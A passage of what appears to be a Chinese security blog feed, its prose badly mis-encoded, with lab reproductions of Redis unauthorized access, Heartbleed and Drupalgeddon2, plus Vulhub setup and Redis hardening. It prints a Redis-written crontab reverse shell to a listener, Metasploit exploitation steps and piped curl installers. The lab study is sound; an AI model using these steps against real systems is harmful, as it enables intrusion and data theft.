class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crontab </span><br><span class="line">-l#æŸ¥çœ‹å½“å‰ä»»åŠ¡</span><br><span class="line">-r#åˆ é™¤ä»»åŠ¡</span><br><span class="line">-e#ç¼–è¾‘</span><br><span class="line">6éƒ¨åˆ†ï¼šåˆ†é’Ÿ å°æ—¶ å¤© æœˆ æ˜ŸæœŸ å‘½ä»¤/è„šæœ¬</span><br><span class="line">*/2 * * * * echo &quot;this is test&quot; &gt;&gt;/tmp/backup</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å½“å‰ä»»åŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/spool/cron/</span><br><span class="line">ls</span><br><span class="line">cat root</span><br><span class="line">è¯¥æ–‡ä»¶å†…å®¹ç­‰åŒäº</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p>å†™å…¥crontabå®šæ—¶ä»»åŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xx &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…æœåŠ¡ç«¯å¼€å¯ç›‘å¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 7999</span><br></pre></td></tr></table></figure><p><img src="/2019/05/15/Redisæœªæˆæƒè®¿é—®æ¼æ´/1557925558674.png" alt="1557925558674"></p><h2 id="å…­ã€ä¿®å¤"><a href="#å…­ã€ä¿®å¤" class="headerlink" title="å…­ã€ä¿®å¤"></a>å…­ã€ä¿®å¤</h2><h4 id="ä½æƒé™è¿è¡ŒRedisæœåŠ¡"><a href="#ä½æƒé™è¿è¡ŒRedisæœåŠ¡" class="headerlink" title="ä½æƒé™è¿è¡ŒRedisæœåŠ¡"></a>ä½æƒé™è¿è¡ŒRedisæœåŠ¡</h4><p>é¿å…ä½¿ç”¨<code>root</code>ç”¨æˆ·èº«ä»½å¯åŠ¨<code>Redis</code>æœåŠ¡ï¼Œé€‰æ‹©æƒé™è¾ƒä½çš„ç”¨æˆ·è¿è¡Œ<code>rides</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure><h4 id="ç¦æ­¢å‘½ä»¤"><a href="#ç¦æ­¢å‘½ä»¤" class="headerlink" title="ç¦æ­¢å‘½ä»¤"></a>ç¦æ­¢å‘½ä»¤</h4><p>é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶æ¥ç¦æ­¢ä¸€äº›é«˜é£é™©çš„å‘½ä»¤ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">...</span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ å¯†ç è®¤è¯"><a href="#æ·»åŠ å¯†ç è®¤è¯" class="headerlink" title="æ·»åŠ å¯†ç è®¤è¯"></a>æ·»åŠ å¯†ç è®¤è¯</h4><p>é€šè¿‡é…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">requirepass PASSWORD</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥é€šè¿‡ <code>Redis</code>çš„å‘½ä»¤è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set requirepass PASSWORD</span><br></pre></td></tr></table></figure><h4 id="ç¦æ­¢å¤–ç½‘è®¿é—®"><a href="#ç¦æ­¢å¤–ç½‘è®¿é—®" class="headerlink" title="ç¦æ­¢å¤–ç½‘è®¿é—®"></a>ç¦æ­¢å¤–ç½‘è®¿é—®</h4><p>é€šè¿‡é˜²ç«å¢™ç­‰é…ç½®æ¥ç¦æ­¢å¤–ç½‘è®¿é—®ã€‚</p><h2 id="ä¸ƒã€æ€»ç»“"><a href="#ä¸ƒã€æ€»ç»“" class="headerlink" title="ä¸ƒã€æ€»ç»“"></a>ä¸ƒã€æ€»ç»“</h2><p><code>Redis</code>åŒ¿åè®¿é—®æ¼æ´ç”±ä¸å®‰å…¨çš„è¿ç»´é…ç½®å¼•èµ·çš„ï¼Œä½œä¸ºé…ç½® <code>Redis</code>çš„å¼€å‘äººå‘˜æˆ–è¿ç»´äººå‘˜ä¸€å®šè¦æœ‰ä¸€å®šçš„å®‰å…¨æ„è¯†ï¼Œæ‰èƒ½æ›´å¥½çš„å®ç°çœŸæ­£çš„å®‰å…¨ã€‚</p><h2 id="å…«ã€å‚è€ƒæ–‡ç« ï¼š"><a href="#å…«ã€å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å…«ã€å‚è€ƒæ–‡ç« ï¼š"></a>å…«ã€å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486083&amp;idx=1&amp;sn=666450400463d4e5859dc5cc44e1c125&amp;chksm=fbf790f3cc8019e5cf5bc18d9613cdf753843ff168287aa02a7ffbbf10b1de14adda5014efd3&amp;mpshare=1&amp;scene=1&amp;srcid=0515suowq2IQTtgTS6p7CQYB&amp;key=6d5a213b9d007c25d3d2231d6bd6b4201c5288fd64eedafa935ba639a2fa4d47aeee0e6b412b4bf9d5bfa0b2a643faab2c1a323181f0b350c9abc93031a416d1ec1ba77485db2a58ba65a9d010cb0aa2&amp;ascene=1&amp;uin=MTU1MTA3MzA3OQ%3D%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=i1OV73MX6FUakKhfB6AFSufopQjomZv%2FYeYRGSAQ3oprOhX%2BLJdD5rJJCyLpPXYG" target="_blank" rel="noopener">RedisåŒ¿åè®¿é—®æ¼æ´</a></p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ–‡ç«  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2014-0160-å¿ƒè„æ»´è¡€æ¼æ´</title>
      <link href="/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€æ¼æ´ä»‹ç»"><a href="#ä¸€ã€æ¼æ´ä»‹ç»" class="headerlink" title="ä¸€ã€æ¼æ´ä»‹ç»"></a>ä¸€ã€æ¼æ´ä»‹ç»</h2><p><strong>CVE ID</strong>:</p><p>CVE-2014-0160</p><p><strong>æ¼æ´èŒƒå›´</strong>ï¼š</p><p>OpenSSL1.0.1</p><p><strong>æ¼æ´æˆå› </strong>ï¼š</p><p>Heartbleedæ¼æ´æ˜¯ç”±äºæœªèƒ½åœ¨memcpy()è°ƒç”¨å—å®³ç”¨æˆ·è¾“å…¥å†…å®¹ä½œä¸ºé•¿åº¦å‚æ•°ä¹‹å‰æ­£ç¡®è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ã€‚æ”»å‡»è€…å¯ä»¥è¿½è¸ªOpenSSLæ‰€åˆ†é…çš„64KBç¼“å­˜ã€å°†è¶…å‡ºå¿…è¦èŒƒå›´çš„å­—èŠ‚ä¿¡æ¯å¤åˆ¶åˆ°ç¼“å­˜å½“ä¸­å†è¿”å›ç¼“å­˜å†…å®¹ï¼Œè¿™æ ·ä¸€æ¥å—å®³è€…çš„å†…å­˜å†…å®¹å°±ä¼šä»¥æ¯æ¬¡64KBçš„é€Ÿåº¦è¿›è¡Œæ³„éœ²ã€‚</p><a id="more"></a><p><strong>æ¼æ´å±å®³</strong>ï¼š</p><p>å¦‚åŒæ¼æ´æˆå› æ‰€è®²ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥æ¼æ´è¯»å–æ¯æ¬¡æ”»å‡»æ³„éœ²å‡ºæ¥çš„ä¿¡æ¯ï¼Œæ‰€ä»¥å¯èƒ½ä¹Ÿå¯ä»¥è·å–åˆ°æœåŠ¡å™¨çš„ç§é’¥ï¼Œç”¨æˆ·cookieå’Œå¯†ç ç­‰ã€‚</p><h2 id="äºŒã€æ¼æ´å¤ç°"><a href="#äºŒã€æ¼æ´å¤ç°" class="headerlink" title="äºŒã€æ¼æ´å¤ç°"></a>äºŒã€æ¼æ´å¤ç°</h2><p>ç¯å¢ƒï¼š bee-boxè™šæ‹Ÿæœº(å·²é›†æˆè¯¥æ¼æ´ç¯å¢ƒ)<br>bee-boxè™šæ‹Ÿæœºä¸‹è½½åœ°å€ï¼š<a href="https://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank" rel="noopener">é“¾æ¥</a></p><h3 id="1-ä½¿ç”¨å·¥å…·è¿›è¡Œåˆ©ç”¨"><a href="#1-ä½¿ç”¨å·¥å…·è¿›è¡Œåˆ©ç”¨" class="headerlink" title="1. ä½¿ç”¨å·¥å…·è¿›è¡Œåˆ©ç”¨"></a>1. ä½¿ç”¨å·¥å…·è¿›è¡Œåˆ©ç”¨</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><ol><li><p>é¦–å…ˆç¡®å®šç›®æ ‡å’Œç«¯å£ä¿¡æ¯</p><p><img src="/2019/05/01/CVE-2014-0160-å¿ƒè„æ»´è¡€æ¼æ´/1556676583087.png" alt="1556676583087"></p><p>å¯ä»¥çœ‹åˆ°å­˜åœ¨æ¼æ´çš„ç«¯å£ä¸º8443</p></li><li><p>ä½¿ç”¨nmapè„šæœ¬è¿›è¡Œæ¼æ´æ£€æµ‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.224.131</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-å¿ƒè„æ»´è¡€æ¼æ´/1556676900297.png" alt="1556676900297"></p><p>å¯ä»¥çœ‹åˆ°è¯¥æ¼æ´å­˜åœ¨</p></li></ol><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><ol><li><p>ä½¿ç”¨msfçš„expè¿›è¡Œæ¼æ´åˆ©ç”¨</p><ol><li><p>æ‰“å¼€msfconsole</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-å¿ƒè„æ»´è¡€æ¼æ´/1556677575168.png" alt="1556677575168"></p></li><li><p>æŸ¥æ‰¾heartbleedæ¨¡å—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-å¿ƒè„æ»´è¡€æ¼æ´/1556677615995.png" alt="1556677615995"></p></li><li><p>ä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssl/openssl_heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-å¿ƒè„æ»´è¡€æ¼æ´/1556677661603.png" alt="1556677661603"></p><p>ç¬¬äºŒä¸ªæ¨¡å—æ˜¯ç”¨æ¥</p></li><li><p>æŸ¥çœ‹è®¾ç½®é€‰é¡¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshow options</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-å¿ƒè„æ»´è¡€æ¼æ´/1556677730237.png" alt="1556677730237"></p></li><li><p>è®¾ç½®RHOSTï¼ŒRPORT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.11.59</span><br><span class="line">set RPORT 443</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-å¿ƒè„æ»´è¡€æ¼æ´/1556677783208.png" alt="1556677783208"></p></li><li><p>è®¾ç½®VERBOSREï¼Œå€¼ä¸ºtrueæ‰èƒ½çœ‹åˆ°æ³„æ¼çš„ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set</span><br><span class="line">set VERBOSE true</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-å¿ƒè„æ»´è¡€æ¼æ´/1556677911981.png" alt="1556677911981"></p></li><li><p>æ‰§è¡Œpaload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœæœ‰äººæ­£åœ¨ç™»é™†è¯¥webåº”ç”¨ï¼Œå¯èƒ½è·å–åˆ°è´¦å·å¯†ç ç­‰ä¿¡æ¯</p><p><img src="/2019/05/01/CVE-2014-0160-å¿ƒè„æ»´è¡€æ¼æ´/1556684475023.png" alt="1556684475023"></p><p>æ²¡æœ‰è·å–åˆ°æ•°æ®æ˜¯å› ä¸ºæ²¡æœ‰äººç™»é™†è¯¥åº”ç”¨æˆ–è€…ç™»é™†è¾ƒå°‘</p><p>ä¸‹å›¾æ˜¯ä¹‹å‰è·å–åˆ°æ•°æ®çš„ç¤ºä¾‹</p><p><img src="/2019/05/01/CVE-2014-0160-å¿ƒè„æ»´è¡€æ¼æ´/1556679300981.png" alt="1556679300981"></p></li></ol></li></ol><h3 id="2-ä½¿ç”¨pythonè„šæœ¬"><a href="#2-ä½¿ç”¨pythonè„šæœ¬" class="headerlink" title="2. ä½¿ç”¨pythonè„šæœ¬"></a>2. ä½¿ç”¨pythonè„šæœ¬</h3><h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/poc.py" target="_blank" rel="noopener">PoC</a></h4><p>ä¿®æ”¹ <code>poc.py</code> ä¸­ <code>check</code> å‡½æ•°çš„åœ°å€å’Œç«¯å£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">check(&apos;192.168.59.103&apos;, 443)</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œpoc.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py</span><br></pre></td></tr></table></figure><p>å¦‚æœçœ‹åˆ° <code>Heartbleed OpenSSL</code> åˆ™ä»£è¡¨å­˜åœ¨æ¼æ´ã€‚</p><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/exp.py" target="_blank" rel="noopener">Exp</a></h4><p>æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 192.168.59.103</span><br></pre></td></tr></table></figure><p>è¯»å–åˆ°çš„ä¿¡æ¯åœ¨å½“å‰ç›®å½•ä¸‹çš„ <code>result.txt</code> å†…ã€‚</p><blockquote><p>å…·ä½“ä½¿ç”¨å‚æ•°è¯·ä½¿ç”¨ <code>python exp.py -h</code></p></blockquote><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://www.jianshu.com/u/13c720cf85fc" target="_blank" rel="noopener">ch3ckr</a>ï¼š <a href="https://www.jianshu.com/p/08600e2f4530" target="_blank" rel="noopener">https://www.jianshu.com/p/08600e2f4530</a></p><p><a href="https://github.com/Medicean" target="_blank" rel="noopener">Medicean</a>ï¼š<a href="https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Docker+Vulhubæ­å»ºæ¼æ´æµ‹è¯•é¶åœº</title>
      <link href="/2019/04/28/%E4%BD%BF%E7%94%A8Docker-Vulhub%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/"/>
      <url>/2019/04/28/%E4%BD%BF%E7%94%A8Docker-Vulhub%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ä»‹ç»"><a href="#ä¸€ã€ä»‹ç»" class="headerlink" title="ä¸€ã€ä»‹ç»"></a>ä¸€ã€ä»‹ç»</h2><p>Vulhubæ˜¯ä¸€ä¸ªåŸºäº<code>docker</code>å’Œ<code>docker-compose</code>çš„æ¼æ´ç¯å¢ƒé›†åˆï¼Œè¿›å…¥å¯¹åº”ç›®å½•å¹¶æ‰§è¡Œä¸€æ¡è¯­å¥å³å¯å¯åŠ¨ä¸€ä¸ªå…¨æ–°çš„æ¼æ´ç¯å¢ƒï¼Œè®©æ¼æ´å¤ç°å˜å¾—æ›´åŠ ç®€å•ï¼Œè®©å®‰å…¨ç ”ç©¶è€…æ›´åŠ ä¸“æ³¨äºæ¼æ´åŸç†æœ¬èº«ã€‚</p><a id="more"></a><h2 id="äºŒã€å®‰è£…Docker"><a href="#äºŒã€å®‰è£…Docker" class="headerlink" title="äºŒã€å®‰è£…Docker"></a>äºŒã€å®‰è£…Docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>é…ç½®å›½å†…åŠ é€Ÿå™¨ï¼Œå¯ä»¥æ›´å¿«çš„æ‹‰å–é•œåƒèµ„æº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€å®‰è£…docker-compose"><a href="#ä¸‰ã€å®‰è£…docker-compose" class="headerlink" title="ä¸‰ã€å®‰è£…docker-compose"></a>ä¸‰ã€å®‰è£…docker-compose</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python//å®‰è£…PIP</span><br><span class="line">pip install docker-compose//å®‰è£…docker-compose</span><br></pre></td></tr></table></figure><h2 id="å››ã€ä¸‹è½½Vulhub"><a href="#å››ã€ä¸‹è½½Vulhub" class="headerlink" title="å››ã€ä¸‹è½½Vulhub"></a>å››ã€ä¸‹è½½Vulhub</h2><p>å®‰è£…å®Œæˆdockerå’Œdocker-composeåï¼Œæ‹‰å–Vulhubåˆ°æœ¬åœ°ä»»æ„ç›®å½•å³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆåï¼Œæ‰§è¡Œ<code>docker-compose -v</code>ï¼Œæœ‰è¿”å›åˆ™è¯´æ˜å®‰è£…æˆåŠŸã€‚</p><h2 id="äº”ã€å¯åŠ¨æ¼æ´ç¯å¢ƒ"><a href="#äº”ã€å¯åŠ¨æ¼æ´ç¯å¢ƒ" class="headerlink" title="äº”ã€å¯åŠ¨æ¼æ´ç¯å¢ƒ"></a>äº”ã€å¯åŠ¨æ¼æ´ç¯å¢ƒ</h2><p>docker-composeä¼šè‡ªåŠ¨æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶ï¼ˆé»˜è®¤æ–‡ä»¶åä¸º<code>docker-compose.yml</code>ï¼‰ï¼Œå¹¶æ ¹æ®å…¶å†…å®¹ç¼–è¯‘é•œåƒå’Œå¯åŠ¨å®¹å™¨ã€‚æ‰€ä»¥ï¼Œè¦è¿è¡ŒæŸä¸ªæ¼æ´é¶åœºï¼Œéœ€è¦å…ˆè¿›å…¥è¯¥æ¼æ´æ‰€åœ¨çš„ç›®å½•ã€‚</p><p>åœ¨è¿™é‡Œæ¼”ç¤ºDrupal &lt; 7.32 â€œDrupalgeddonâ€ SQLæ³¨å…¥æ¼æ´ï¼Œè¿›å…¥<code>drupal/CVE-2014-3704/</code>ç›®å½•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /your-Vuln-Path/drupal/CVE-2014-3704/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>ç¯å¢ƒå¯åŠ¨åï¼Œè®¿é—®<code>http://your-ip:8080</code>å³å¯çœ‹åˆ°Drupalçš„å®‰è£…é¡µé¢ï¼Œä½¿ç”¨é»˜è®¤é…ç½®å®‰è£…å³å¯ã€‚</p><p>å…¶ä¸­ï¼ŒMysqlæ•°æ®åº“åå¡«å†™<code>drupal</code>ï¼Œæ•°æ®åº“ç”¨æˆ·åã€å¯†ç ä¸º<code>root</code>ï¼Œåœ°å€ä¸º<code>mysql</code>ï¼š</p><p><img src="/2019/04/28/ä½¿ç”¨Docker-Vulhubæ­å»ºæ¼æ´æµ‹è¯•é¶åœº/1554803517373.png" alt="1554803517373"></p><p><img src="/2019/04/28/ä½¿ç”¨Docker-Vulhubæ­å»ºæ¼æ´æµ‹è¯•é¶åœº/1554803658364.png" alt="1554803658364"></p><p>å®‰è£…å®Œæˆåï¼Œè®¿é—®é¦–é¡µï¼š</p><p><img src="/2019/04/28/ä½¿ç”¨Docker-Vulhubæ­å»ºæ¼æ´æµ‹è¯•é¶åœº/1554803788919.png" alt="1554803788919"></p><h2 id="å…­ã€æ¼æ´æµ‹è¯•"><a href="#å…­ã€æ¼æ´æµ‹è¯•" class="headerlink" title="å…­ã€æ¼æ´æµ‹è¯•"></a>å…­ã€æ¼æ´æµ‹è¯•</h2><h3 id="1-cmsmapæ‰«æcmsæ¼æ´"><a href="#1-cmsmapæ‰«æcmsæ¼æ´" class="headerlink" title="1. cmsmapæ‰«æcmsæ¼æ´"></a>1. cmsmapæ‰«æcmsæ¼æ´</h3><ol><li><p>ä¸‹è½½cmsmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Dionach/CMSmap.git</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£…parseæ¨¡å—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install parse</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨pythonè¿è¡Œæ‰«æè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cmsmap.py http://192.168.10.18:8080</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æ¼æ´è¯¦æƒ…</p><p><img src="/2019/04/28/ä½¿ç”¨Docker-Vulhubæ­å»ºæ¼æ´æµ‹è¯•é¶åœº/1554804365543.png" alt="1554804365543"></p></li></ol><h3 id="2-ä½¿ç”¨metasploitè¿›è¡Œæ¼æ´åˆ©ç”¨"><a href="#2-ä½¿ç”¨metasploitè¿›è¡Œæ¼æ´åˆ©ç”¨" class="headerlink" title="2. ä½¿ç”¨metasploitè¿›è¡Œæ¼æ´åˆ©ç”¨"></a>2. ä½¿ç”¨metasploitè¿›è¡Œæ¼æ´åˆ©ç”¨</h3><ol><li><p>å¯åŠ¨metasploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure></li><li><p>æœç´¢å¯åˆ©ç”¨æ¨¡å—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2//ä½¿ç”¨è¯¥æ¨¡å—</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/ä½¿ç”¨Docker-Vulhubæ­å»ºæ¼æ´æµ‹è¯•é¶åœº/1554807336176.png" alt="1554807336176"></p></li><li><p>è®¾ç½®é…ç½®å‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show options//æŸ¥çœ‹å¯é…ç½®é€‰é¡¹</span><br><span class="line">set rhost 192.168.10.18//è®¾ç½®ç›®æ ‡IP</span><br><span class="line">set rport 8080//è®¾ç½®ç›®æ ‡ç«¯å£</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/ä½¿ç”¨Docker-Vulhubæ­å»ºæ¼æ´æµ‹è¯•é¶åœº/1554807568020.png" alt="1554807568020"></p></li><li><p>æ‰§è¡Œexp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run//å¼€å§‹æ¼æ´åˆ©ç”¨</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/ä½¿ç”¨Docker-Vulhubæ­å»ºæ¼æ´æµ‹è¯•é¶åœº/1554807630335.png" alt="1554807630335"></p></li><li><p>è·å–åå¼¹shell</p><p><img src="/2019/04/28/ä½¿ç”¨Docker-Vulhubæ­å»ºæ¼æ´æµ‹è¯•é¶åœº/1554807710493.png" alt="1554807710493"></p></li></ol><h2 id="ä¸ƒã€ç§»é™¤ç¯å¢ƒ"><a href="#ä¸ƒã€ç§»é™¤ç¯å¢ƒ" class="headerlink" title="ä¸ƒã€ç§»é™¤ç¯å¢ƒ"></a>ä¸ƒã€ç§»é™¤ç¯å¢ƒ</h2><p>Vulhubä¸­æ‰€æœ‰ç¯å¢ƒå‡ä¸ºæ¼æ´é¶åœºï¼Œåœ¨æµ‹è¯•ç»“æŸåï¼Œè¯·åŠæ—¶å…³é—­å¹¶ç§»é™¤ç¯å¢ƒï¼Œé¿å…è¢«ä»–äººæ¶æ„åˆ©ç”¨ã€‚</p><p>æ¼æ´æµ‹è¯•ç»“æŸåï¼Œè¿”å›åˆ°<code>drupal/CVE-2014-3704/</code>ç›®å½•ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ç§»é™¤ç¯å¢ƒï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°å‘½ä»¤ä¼šæ‰§è¡Œå¦‚ä¸‹å‡ ä¸ªåŠ¨ä½œï¼š</p><ul><li>å…³é—­æ­£åœ¨è¿è¡Œçš„å®¹å™¨</li><li>åˆ é™¤æ‰€æœ‰ç›¸å…³å®¹å™¨</li><li>ç§»é™¤NATï¼ˆdocker-composeåœ¨è¿è¡Œçš„æ—¶å€™ä¼šåˆ›å»ºä¸€ä¸ªNATç½‘æ®µï¼‰</li></ul><p>ä½†ä¸ä¼šç§»é™¤ç¼–è¯‘å¥½çš„æ¼æ´é•œåƒï¼Œä¸‹æ¬¡å†æ‰§è¡Œ<code>docker-compose up -d</code>å‘½ä»¤ï¼Œå°±ä¸éœ€è¦å†æ¬¡ç¼–è¯‘ç›¸å…³é•œåƒäº†ã€‚</p><p><strong>å‚è€ƒé“¾æ¥</strong>ï¼š</p><p>Vulhubå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://vulhub.org/#/docs/" target="_blank" rel="noopener">https://vulhub.org/#/docs/</a></p>]]></content>
      
      
      <categories>
          
